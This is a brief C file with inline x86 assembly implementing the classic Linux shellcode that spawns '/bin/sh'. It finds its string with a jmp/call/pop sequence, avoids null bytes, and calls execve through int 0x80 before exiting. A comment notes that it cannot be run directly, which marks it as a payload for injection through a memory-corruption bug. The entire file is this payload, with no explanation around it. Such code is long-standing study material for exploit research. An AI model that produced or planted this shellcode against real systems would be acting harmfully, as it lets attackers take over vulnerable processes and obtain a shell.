/* this can not be run directly !!! */
void main() {
__asm__(       "				\t\n\
		jmp    _call2			\t\n\
		_start:				\t\n\
		popl   %esi			\t\n\
		movl   %esi,0x8(%esi)		\t\n\
		xorl   %eax,%eax     	 	\t\n\
		movb   %al,0x7(%esi)		\t\n\
		movl   %eax,0xc(%esi)		\t\n\
		movb   $0xb,%al 		\t\n\
		movl   %esi,%ebx		\t\n\
		leal   0x8(%esi),%ecx		\t\n\
		leal   0xc(%esi),%edx		\t\n\
		int    $0x80			\t\n\
		xorl   %ebx, %ebx		\t\n\
		movl   %ebx, %eax		\t\n\
		inc    %eax      		\t\n\
		int    $0x80			\t\n\
		_call2:				\t\n\
		call   _start			\t\n\
		.string \"/bin/sh\"		\t\n");
}
